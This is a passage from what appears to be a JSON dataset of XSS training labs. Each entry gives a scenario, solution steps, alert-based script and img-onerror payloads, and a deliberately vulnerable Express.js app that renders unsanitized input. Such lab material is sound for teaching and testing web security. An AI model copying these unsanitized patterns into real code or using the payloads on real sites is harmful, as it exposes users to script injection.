        "Observe XSS on folder render"
      ],
      "payloads": [
        "<script>alert('folderXSS')</script>",
        "<img src=x onerror=alert('folder')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet folders = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-folder', (req, res) => { folders.push(req.body.name); res.redirect('/files'); });\napp.get('/files', (req, res) => { const html = folders.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom footer message in landing page builder",
      "Lab Description": "The landing page builder allows setting custom footer text. If rendered without sanitization using innerHTML, this opens the door for stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter footer text: <script>alert('footer')</script>",
        "Publish and view landing page",
        "Observe payload execution in footer"
      ],
      "payloads": [
        "<script>alert('footerXSS')</script>",
        "<img src=x onerror=alert('foot')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet footer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-footer', (req, res) => { footer = req.body.text; res.redirect('/landing'); });\napp.get('/landing', (req, res) => { res.send(`<html><body><footer>${footer}</footer></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via e-learning module title input",
      "Lab Description": "Course creators can enter module titles in the LMS. These titles are rendered in the course overview using innerHTML. XSS occurs when a malicious title is entered.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create module: <img src=x onerror=alert(1)>",
        "Open course overview page",
        "Script executes on title render"
      ],
      "payloads": [
        "<script>alert('moduleXSS')</script>",
        "<img src=x onerror=alert('lesson')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-module', (req, res) => { title = req.body.title; res.redirect('/course'); });\napp.get('/course', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via code snippet filename in IDE preview",
      "Lab Description": "The in-browser IDE displays filenames next to code snippets. If the name is unsanitized and rendered with innerHTML, XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a file named <img src=x onerror=alert(1)>",
        "Open file preview in IDE",
        "Observe script execution in filename label"
      ],
      "payloads": [
        "<script>alert('fileXSS')</script>",
        "<img src=x onerror=alert('ide')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet filename = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-file', (req, res) => { filename = req.body.name; res.redirect('/editor'); });\napp.get('/editor', (req, res) => { res.send(`<html><body><h3>${filename}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via job listing custom location field",
      "Lab Description": "Job posters can specify custom locations. These locations are displayed using innerHTML on job listings. A malicious location results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Post job with location: <script>alert(1)</script>",
        "View public job board",
        "Script executes from location field"
      ],
      "payloads": [
        "<script>alert('locationXSS')</script>",
        "<img src=x onerror=alert('loc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet location = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/post-job', (req, res) => { location = req.body.loc; res.redirect('/jobs'); });\napp.get('/jobs', (req, res) => { res.send(`<html><body><span>${location}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via personal goal title in productivity app",
      "Lab Description": "Users can set personal goals with titles. These titles are rendered in the dashboard via innerHTML. A crafted title leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create goal: <img src=x onerror=alert(1)>",
        "Visit dashboard",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('goalXSS')</script>",
        "<img src=x onerror=alert('goal')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet goal = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-goal', (req, res) => { goal = req.body.title; res.redirect('/goals'); });\napp.get('/goals', (req, res) => { res.send(`<html><body><h2>${goal}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via document annotation popup content",
      "Lab Description": "The document viewer displays popup annotations on hover. If annotations are stored using innerHTML, XSS can be triggered via crafted annotation content.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add annotation: <img src=x onerror=alert(1)>",
        "Hover over annotated section",
        "Payload triggers in popup"
      ],
      "payloads": [
        "<script>alert('annotateXSS')</script>",
        "<img src=x onerror=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet annotation = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { annotation = req.body.note; res.redirect('/viewer'); });\napp.get('/viewer', (req, res) => { res.send(`<html><body><div title='${annotation}'>Hover here</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via stock ticker symbol display",
      "Lab Description": "The financial dashboard allows tracking stock tickers. If the symbol is reflected in the UI using innerHTML, attackers can inject XSS via the ticker name.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Track symbol: <img src=x onerror=alert(1)>",
        "Open stock dashboard",
        "Observe execution in ticker element"
      ],
      "payloads": [
        "<script>alert('stockXSS')</script>",
        "<img src=x onerror=alert('ticker')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet ticker = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/track-stock', (req, res) => { ticker = req.body.symbol; res.redirect('/stocks'); });\napp.get('/stocks', (req, res) => { res.send(`<html><body><span>${ticker}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via system alert configuration message",
      "Lab Description": "System administrators can configure custom alert messages. If the message is reflected using innerHTML, XSS may occur in global alert modals.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set alert message: <script>alert('XSS')</script>",
        "Trigger system alert modal",
        "Observe script execution in alert content"
      ],
      "payloads": [
        "<script>alert('alertXSS')</script>",
        "<img src=x onerror=alert('sys')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet alertMsg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-alert', (req, res) => { alertMsg = req.body.message; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><div class='modal'>${alertMsg}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via API key description in developer dashboard",
      "Lab Description": "The developer dashboard allows users to label their API keys with custom descriptions. These labels are rendered using innerHTML. A malicious description leads to persistent XSS when viewing the key list.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create API key with description: <img src=x onerror=alert(1)>",
        "Go to developer dashboard",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('apikeyXSS')</script>",
        "<img src=x onerror=alert('key')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet keys = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-key', (req, res) => { keys.push(req.body.desc); res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { const html = keys.map(k => `<div>${k}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via event log tag entry in admin panel",
      "Lab Description": "Event logs are tagged for easier filtering. Tags are rendered into filter dropdowns using innerHTML. A malicious tag name can lead to XSS when admins browse filters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create tag: <img src=x onerror=alert(1)>",
        "Admin views event log filters",
        "Payload executes inside dropdown"
      ],
      "payloads": [
        "<script>alert('logTagXSS')</script>",
        "<img src=x onerror=alert('tag')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tags = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-tag', (req, res) => { tags.push(req.body.name); res.redirect('/logs'); });\napp.get('/logs', (req, res) => { const html = tags.map(t => `<option>${t}</option>`).join(''); res.send(`<html><body><select>${html}</select></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user's 'current mood' status",
      "Lab Description": "Social profiles display a 'current mood' message submitted by users. The message is shown using innerHTML, and a malicious payload can lead to XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set mood to <script>alert('mood')</script>",
        "Visit profile or friend list",
        "Observe XSS execution"
      ],
      "payloads": [
        "<script>alert('moodXSS')</script>",
        "<img src=x onerror=alert('mood')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet mood = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-mood', (req, res) => { mood = req.body.mood; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><p>${mood}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom bookmark folder name",
      "Lab Description": "Users can organize saved pages into folders with custom names. If the folder name is rendered using innerHTML, XSS can occur.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Name a folder: <img src=x onerror=alert(1)>",
        "View bookmarks list",
        "Observe XSS payload execution"
      ],
      "payloads": [
        "<script>alert('bookmarkXSS')</script>",
        "<img src=x onerror=alert('folder')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet folders = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-folder', (req, res) => { folders.push(req.body.name); res.redirect('/bookmarks'); });\napp.get('/bookmarks', (req, res) => { const html = folders.map(f => `<li>${f}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via comment system reaction emoji label",
      "Lab Description": "Users can assign custom text labels to emoji reactions. These labels are shown in tooltips using innerHTML. A crafted label triggers XSS on hover.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add emoji label: <img src=x onerror=alert(1)>",
        "Hover over the emoji",
        "Observe script execution in tooltip"
      ],
      "payloads": [
        "<script>alert('emojiXSS')</script>",
        "<img src=x onerror=alert('emoji')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-label', (req, res) => { label = req.body.label; res.redirect('/comments'); });\napp.get('/comments', (req, res) => { res.send(`<html><body><span title='${label}'>😀</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via account deletion reason",
      "Lab Description": "When a user deletes their account, they can submit a reason. Admins review this input in a panel that uses innerHTML, allowing for persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit reason: <img src=x onerror=alert(1)>",
        "Admin opens deletion panel",
        "Payload executes on view"
      ],
      "payloads": [
        "<script>alert('deleteXSS')</script>",
        "<img src=x onerror=alert('reason')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reasons = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/delete-account', (req, res) => { reasons.push(req.body.reason); res.redirect('/'); });\napp.get('/admin/deletions', (req, res) => { const html = reasons.map(r => `<li>${r}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via CRM contact note rendering",
      "Lab Description": "Sales agents can log notes on client records. If these notes are rendered using innerHTML, a malicious note can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add note: <script>alert(1)</script>",
        "Open CRM client page",
        "Script executes in notes section"
      ],
      "payloads": [
        "<script>alert('crmNoteXSS')</script>",
        "<img src=x onerror=alert('crm')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { notes.push(req.body.note); res.redirect('/client'); });\napp.get('/client', (req, res) => { const html = notes.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via online store shipping method label",
      "Lab Description": "Vendors can define custom shipping method names. If rendered unsanitized, these names can introduce XSS in the checkout interface.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create shipping label: <img src=x onerror=alert(1)>",
        "Customer opens shipping method options",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('shippingXSS')</script>",
        "<img src=x onerror=alert('ship')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet methods = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-method', (req, res) => { methods.push(req.body.label); res.redirect('/checkout'); });\napp.get('/checkout', (req, res) => { const html = methods.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via appointment title in calendar tooltip",
      "Lab Description": "Calendar events display their titles in tooltips. If the title includes a malicious payload and is rendered with innerHTML, XSS can occur on hover.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create event title: <img src=x onerror=alert(1)>",
        "Hover over calendar event",
        "Observe XSS execution"
      ],
      "payloads": [
        "<script>alert('calendarXSS')</script>",
        "<img src=x onerror=alert('event')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet event = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { event = req.body.title; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div title='${event}'>📅</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via live auction item name",
      "Lab Description": "The auction platform allows sellers to name items freely. These names are rendered in real-time to all viewers using innerHTML. A crafted name results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "List item with name: <script>alert('auction')</script>",
        "Join auction room",
        "Observe payload execution on item broadcast"
      ],
      "payloads": [
        "<script>alert('auctionXSS')</script>",
        "<img src=x onerror=alert('bid')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet items = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/list-item', (req, res) => { items.push(req.body.name); res.redirect('/auction'); });\napp.get('/auction', (req, res) => { const html = items.map(i => `<div>${i}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via profile badge custom label",
      "Lab Description": "Users can customize labels for their profile badges. These labels are rendered using innerHTML on profile visits. A malicious label can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Edit badge label to: <img src=x onerror=alert(1)>",
        "Visit user profile",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('badgeXSS')</script>",
        "<img src=x onerror=alert('label')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-badge', (req, res) => { label = req.body.label; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><span>${label}</span></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via team introduction blurb",
      "Lab Description": "Team pages allow admins to add an intro blurb. This is shown on public team profiles using innerHTML. Unsanitized input leads to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit blurb: <img src=x onerror=alert(1)>",
        "Visit the team page",
        "Script executes from blurb area"
      ],
      "payloads": [
        "<script>alert('teamIntroXSS')</script>",
        "<img src=x onerror=alert('intro')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet blurb = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-blurb', (req, res) => { blurb = req.body.text; res.redirect('/team'); });\napp.get('/team', (req, res) => { res.send(`<html><body><p>${blurb}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via meeting agenda topic title",
      "Lab Description": "Meeting organizers can define custom agenda topics. These are shown on shared pages using innerHTML. A malicious title results in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create agenda with: <script>alert('agenda')</script>",
        "Open agenda viewer",
        "Script executes in topic list"
      ],
      "payloads": [
        "<script>alert('agendaXSS')</script>",
        "<img src=x onerror=alert('topic')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet topics = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-topic', (req, res) => { topics.push(req.body.title); res.redirect('/agenda'); });\napp.get('/agenda', (req, res) => { const html = topics.map(t => `<li>${t}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via job applicant cover letter filename",
      "Lab Description": "HR portal displays uploaded cover letter filenames. These are inserted into HTML using innerHTML. If filenames are not sanitized, reflected XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload file named: <script>alert(1)</script>",
        "Visit applicant's file list",
        "Script executes in filename display"
      ],
      "payloads": [
        "<script>alert('filenameXSS')</script>",
        "<img src=x onerror=alert('file')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet files = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => { files.push(req.body.name); res.redirect('/files'); });\napp.get('/files', (req, res) => { const html = files.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via food delivery special instruction field",
      "Lab Description": "The app allows customers to provide delivery instructions. These are shown to the courier using innerHTML. A malicious instruction leads to XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit instruction: <script>alert('XSS')</script>",
        "Courier opens delivery details",
        "Payload executes in instructions panel"
      ],
      "payloads": [
        "<script>alert('deliveryXSS')</script>",
        "<img src=x onerror=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/order', (req, res) => { note = req.body.note; res.redirect('/details'); });\napp.get('/details', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via transaction note in personal finance tracker",
      "Lab Description": "Users can tag transactions with notes. These are rendered in reports using innerHTML. A crafted note results in stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add transaction note: <script>alert('XSS')</script>",
        "Open transaction report",
        "Script executes from note column"
      ],
      "payloads": [
        "<script>alert('financeXSS')</script>",
        "<img src=x onerror=alert('txn')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-note', (req, res) => { note = req.body.note; res.redirect('/report'); });\napp.get('/report', (req, res) => { res.send(`<html><body><td>${note}</td></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user-submitted bug reproduction steps",
      "Lab Description": "Bug reporters can enter reproduction steps. These are shown to developers in HTML view. A malicious step can trigger XSS if innerHTML is used.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit step: <script>alert(1)</script>",
        "Open bug detail view",
        "Observe script execution in description"
      ],
      "payloads": [
        "<script>alert('bugStepsXSS')</script>",
        "<img src=x onerror=alert('repro')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet steps = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/report-bug', (req, res) => { steps = req.body.steps; res.redirect('/bug'); });\napp.get('/bug', (req, res) => { res.send(`<html><body><div>${steps}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via recipe comment in cooking platform",
      "Lab Description": "Users can leave comments under recipes. These are rendered using innerHTML. A malicious comment results in stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit comment: <img src=x onerror=alert(1)>",
        "Reload recipe page",
        "Script executes in comment section"
      ],
      "payloads": [
        "<script>alert('recipeXSS')</script>",
        "<img src=x onerror=alert('cook')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet comments = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/recipe'); });\napp.get('/recipe', (req, res) => { const html = comments.map(c => `<div>${c}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via payment failure reason on checkout",
      "Lab Description": "If a payment fails, the gateway may include a failure reason in the redirect. This is reflected using innerHTML, allowing for reflected XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger redirect with reason=<img src=x onerror=alert(1)>",
        "Observe reflected input in failure message",
        "Payload executes immediately"
      ],
      "payloads": [
        "<script>alert('failXSS')</script>",
        "<img src=x onerror=alert('fail')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/fail', (req, res) => {\n  const reason = req.query.reason || 'Unknown error';\n  res.send(`<html><body><h3>${reason}</h3></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via resume headline field in job portal",
      "Lab Description": "Job seekers can add a headline to their resume. This field is displayed on search results using innerHTML. A malicious headline leads to stored XSS when viewed by recruiters.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set resume headline: <img src=x onerror=alert(1)>",
        "Recruiter searches and views your profile",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('resumeXSS')</script>",
        "<img src=x onerror=alert('headline')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet headline = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update-headline', (req, res) => { headline = req.body.headline; res.redirect('/search'); });\napp.get('/search', (req, res) => { res.send(`<html><body><h3>${headline}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via calendar event location field",
      "Lab Description": "Users can add a location to calendar events. The location is rendered using innerHTML in the event details panel. A crafted location can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set event location to: <script>alert('XSS')</script>",
        "Open the event detail modal",
        "Script executes from location field"
      ],
      "payloads": [
        "<script>alert('calendarXSS')</script>",
        "<img src=x onerror=alert('loc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet location = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-event', (req, res) => { location = req.body.location; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><p>${location}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via social media post caption",
      "Lab Description": "Users can create posts with captions. These are rendered using innerHTML on public feeds. A malicious caption leads to persistent XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Post a caption: <img src=x onerror=alert(1)>",
        "View public feed",
        "Script executes from caption section"
      ],
      "payloads": [
        "<script>alert('feedXSS')</script>",
        "<img src=x onerror=alert('caption')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet caption = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-post', (req, res) => { caption = req.body.caption; res.redirect('/feed'); });\napp.get('/feed', (req, res) => { res.send(`<html><body><p>${caption}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via IoT device label in smart home dashboard",
      "Lab Description": "Users can assign custom names to their IoT devices. These names are rendered using innerHTML in the dashboard. A crafted name can cause XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Name device: <img src=x onerror=alert(1)>",
        "Load smart dashboard",
        "Observe payload execution from device label"
      ],
      "payloads": [
        "<script>alert('iotXSS')</script>",
        "<img src=x onerror=alert('smart')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/name-device', (req, res) => { label = req.body.name; res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { res.send(`<html><body><h2>${label}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via user report description in moderation panel",
      "Lab Description": "Users can report posts with a reason. These reasons are shown to moderators using innerHTML. A malicious reason can cause stored XSS in the mod view.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit report with reason: <script>alert('XSS')</script>",
        "Moderator opens reports dashboard",
        "Script executes in reason column"
      ],
      "payloads": [
        "<script>alert('reportXSS')</script>",
        "<img src=x onerror=alert('mod')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reports = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/report', (req, res) => { reports.push(req.body.reason); res.redirect('/'); });\napp.get('/mod', (req, res) => { const html = reports.map(r => `<li>${r}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via video playlist title in streaming platform",
      "Lab Description": "Users can create custom playlists on a video platform. Playlist titles are rendered using innerHTML. A malicious title can lead to stored XSS on the playlist viewer page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a playlist with title: <script>alert('XSS')</script>",
        "Visit the playlist page",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('playlistXSS')</script>",
        "<img src=x onerror=alert('video')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet playlist = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-playlist', (req, res) => { playlist = req.body.title; res.redirect('/view-playlist'); });\napp.get('/view-playlist', (req, res) => { res.send(`<html><body><h2>${playlist}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via friend group name in messaging app",
      "Lab Description": "The app allows grouping contacts under custom labels. Group names are rendered using innerHTML in the sidebar. A crafted group name causes XSS when the group is viewed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create group with name: <img src=x onerror=alert(1)>",
        "Open messaging sidebar",
        "Script executes in group name"
      ],
      "payloads": [
        "<script>alert('groupXSS')</script>",
        "<img src=x onerror=alert('group')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet group = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/create-group', (req, res) => { group = req.body.name; res.redirect('/messenger'); });\napp.get('/messenger', (req, res) => { res.send(`<html><body><div>${group}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via QR code label in scanner dashboard",
      "Lab Description": "Admins can assign labels to QR codes. These labels are rendered using innerHTML in dashboards. A malicious label can trigger XSS in QR viewer.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Label a QR code: <script>alert(1)</script>",
        "Open the QR dashboard",
        "Observe payload execution in label section"
      ],
      "payloads": [
        "<script>alert('qrXSS')</script>",
        "<img src=x onerror=alert('qr')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet label = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/label-qr', (req, res) => { label = req.body.label; res.redirect('/qr-view'); });\napp.get('/qr-view', (req, res) => { res.send(`<html><body><p>${label}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via image gallery tag name",
      "Lab Description": "Users can tag images with custom text. Tag names are rendered using innerHTML below each image. A malicious tag can cause XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add tag: <img src=x onerror=alert(1)>",
        "Open tagged image gallery",
        "Script executes in tag element"
      ],
      "payloads": [
        "<script>alert('tagXSS')</script>",
        "<img src=x onerror=alert('tag')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tag = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-tag', (req, res) => { tag = req.body.tag; res.redirect('/gallery'); });\napp.get('/gallery', (req, res) => { res.send(`<html><body><div>${tag}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via donation message in charity platform",
      "Lab Description": "Supporters can leave a message with their donations. Messages are rendered using innerHTML in public feed. Malicious input leads to stored XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit donation with message: <img src=x onerror=alert(1)>",
        "Visit donation feed",
        "Script executes in message section"
      ],
      "payloads": [
        "<script>alert('donationXSS')</script>",
        "<img src=x onerror=alert('charity')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet msg = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/donate', (req, res) => { msg = req.body.message; res.redirect('/feed'); });\napp.get('/feed', (req, res) => { res.send(`<html><body><blockquote>${msg}</blockquote></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via real-time game lobby name",
